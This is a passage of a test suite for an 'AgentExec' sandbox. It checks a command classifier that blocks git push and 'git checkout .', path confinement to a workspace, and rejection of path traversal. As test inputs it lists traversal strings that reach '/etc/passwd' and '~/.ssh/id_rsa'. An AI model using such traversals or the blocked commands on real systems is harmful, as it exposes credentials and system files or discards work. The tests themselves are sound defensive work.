    expect(classifyCommand('Git', ['Checkout', '.']).verdict).toBe('blocked');
  });

  test('git PUSH is blocked (mixed case push)', () => {
    expect(classifyCommand('git', ['PUSH']).verdict).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: isPathConfined edge cases
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: path confinement edge cases', () => {
  test('empty target with roots is not confined', () => {
    expect(isPathConfined('', ['/workspace'])).toBe(false);
  });

  test('root-only path matches exactly', () => {
    expect(isPathConfined('/workspace', ['/workspace'])).toBe(true);
  });

  test('path with double slashes is confined', () => {
    expect(isPathConfined('/workspace//src//file.zx', ['/workspace'])).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: hasPathTraversal edge cases
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: path traversal edge cases', () => {
  test('single .. segment rejected', () => {
    expect(hasPathTraversal('..')).toBe(true);
  });

  test('deeply nested traversal rejected', () => {
    expect(hasPathTraversal('a/b/c/../../../etc/passwd')).toBe(true);
  });

  test('tilde at start rejected', () => {
    expect(hasPathTraversal('~/.ssh/id_rsa')).toBe(true);
  });

  test('tilde in middle of path rejected', () => {
    expect(hasPathTraversal('home/~/secret')).toBe(true);
  });

  test('triple dot is fine (not traversal)', () => {
    expect(hasPathTraversal('src/.../readme')).toBe(false);
  });
});
